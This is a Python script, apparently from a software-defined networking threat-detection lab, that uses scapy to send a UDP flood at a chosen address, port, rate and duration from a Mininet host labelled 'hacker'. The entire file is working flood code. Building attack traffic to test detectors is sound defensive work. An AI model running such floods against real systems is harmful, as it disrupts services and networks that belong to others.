#!/usr/bin/env python3
"""Run a UDP flood from a Mininet host namespace.

Example usage (from the Mininet CLI):
    mininet> hacker .venv/bin/python3 src/scripts/udp_flood.py 10.0.3.10 -P 53 -d 30 -p 200
"""

from __future__ import annotations

import argparse
import time
from ipaddress import IPv4Address

import scapy.all as scapy  # type: ignore[import-untyped]

FILE_NAME = __file__.split("/")[-1]

# Default flood profile for demo traffic generation.
DEFAULT_UDP_FLOOD_DURATION = 30
DEFAULT_UDP_FLOOD_PPS = 200
DEFAULT_UDP_DPORT = 53
DEFAULT_UDP_PAYLOAD_SIZE = 64


def udp_flood(
    target: IPv4Address,
    *,
    destination_port: int = DEFAULT_UDP_DPORT,
    duration: int = DEFAULT_UDP_FLOOD_DURATION,
    pps: int = DEFAULT_UDP_FLOOD_PPS,
    payload_size: int = DEFAULT_UDP_PAYLOAD_SIZE,
) -> None:
    """Send a burst of UDP packets to a target port.

    Args:
        target: Destination IPv4 address.
        destination_port: Destination UDP port.
        duration: How long to sustain the flood in seconds.
        pps: Packets per second.
        payload_size: Number of bytes carried in each UDP payload.
    """
    if not 1 <= destination_port <= 65535:
        msg = "Destination port must be between 1 and 65535"
        raise ValueError(msg)
    if duration <= 0:
        msg = "Duration must be greater than 0"
        raise ValueError(msg)
    if pps <= 0:
        msg = "Packets per second must be greater than 0"
        raise ValueError(msg)
    if payload_size <= 0:
        msg = "Payload size must be greater than 0"
        raise ValueError(msg)

    interval = 1.0 / pps
    end_time = time.monotonic() + duration
    payload = b"U" * payload_size
    sent_packets = 0

    print(
        f"[{FILE_NAME}] target={target} dport={destination_port} "
        f"{duration=}s {pps=} payload_size={payload_size}"
    )

    while time.monotonic() < end_time:
        packet = (
            scapy.IP(dst=str(target))
            / scapy.UDP(dport=destination_port)
            / scapy.Raw(payload)
        )
        scapy.send(packet, verbose=False)
        sent_packets += 1
        time.sleep(interval)

    print(f"[{FILE_NAME}] done - {sent_packets} packets sent")


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Generate UDP flood traffic for SDN threat detection demo."
    )
    parser.add_argument("target", type=IPv4Address, help="Target IPv4 address")
    parser.add_argument(
        "-P",
        "--destination-port",
        type=int,
        default=DEFAULT_UDP_DPORT,
        help="Destination UDP port (default: %(default)s)",
    )
    parser.add_argument(
        "-d",
        "--duration",
        type=int,
        default=DEFAULT_UDP_FLOOD_DURATION,
        help="Flood duration in seconds (default: %(default)s)",
    )
    parser.add_argument(
        "-p",
        "--pps",
        type=int,
        default=DEFAULT_UDP_FLOOD_PPS,
        help="Packets per second (default: %(default)s)",
    )
    parser.add_argument(
        "-s",
        "--payload-size",
        type=int,
        default=DEFAULT_UDP_PAYLOAD_SIZE,
        help="UDP payload size in bytes (default: %(default)s)",
    )
    return parser


def main() -> None:
    """Entry point for the script."""
    args = _build_parser().parse_args()
    udp_flood(
        args.target,
        destination_port=args.destination_port,
        duration=args.duration,
        pps=args.pps,
        payload_size=args.payload_size,
    )


if __name__ == "__main__":
    main()
